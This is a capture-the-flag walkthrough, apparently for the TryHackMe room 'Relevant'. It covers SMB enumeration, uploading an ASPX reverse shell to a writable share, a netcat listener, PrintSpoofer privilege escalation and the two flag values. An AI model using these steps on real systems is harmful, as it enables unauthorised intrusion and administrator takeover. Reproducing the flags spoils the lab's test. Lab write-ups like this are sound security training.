# Relevant
## 14-06-2022
## level : medium

## Pre-Engagement Briefing

### Nmap Scanning ports and services
```
nmap -sV -p- -T4 10.10.143.95
```

### SMB shares listing 

```
smbclient -L 10.10.143.95
```
after listing the shares we can see that there is a unknown share. lets connect to that share.

```
smbclient \\\\10.10.143.95\\nt4wrksv
```

After connecting to that share we can see there is a file called `password.txt` so lets download it.
```
wget http://10.10.143.95:49663/nt4wrksv/passwords.txt
```

### Downloading a reverse shell for windows server

```
https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
```

Now inside the shell just change the ip address to the local machine tun0 ip and the port number to 1234

Then upload the shell to the smb server using the `put shell.aspx` command

then just start a netcat listener on the local machine

```
nc -lvnp 1234
```

Now just open the link from browser

```
http://10.10.154.14:49663/nt4wrksv/shell.aspx
```

After this in our netcat listener we will get a reverse shell.

to get the userflag go to the `C:\Users\Bob\Desktop` 


and to read the flag use `type user.txt`

### Now we will move to the privilege escalation

in the reverse shell use following to see the privileges

```
whoami /priv
```

download printspoofer in the local machine 
```
https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe
```
upload the PrintSpoofer.exe to the target using the smb.

Now from the reverse shell go to `C:\inetpub\wwwroot\nt4wrksv` a and run the `PrintSpoofer.exe` 
```
PrintSpoofer.exe -i -c cmd
```

After the above command we will get a new cmd prompt which will be of `administrator` privileged.

Now we have to nagigate to `C:\Users\Administrator\Desktop` and read the `root.txt` file using the `type root.txt` command.

| Qu3$t10n$ | 4n$w3r$ |
|-----------|---------|
| user flag | THM{fdk4ka34vk346ksxfr21tg789ktf45} |
| root flag | THM{1fk5kf469devly1gl320zafgl345pv} |
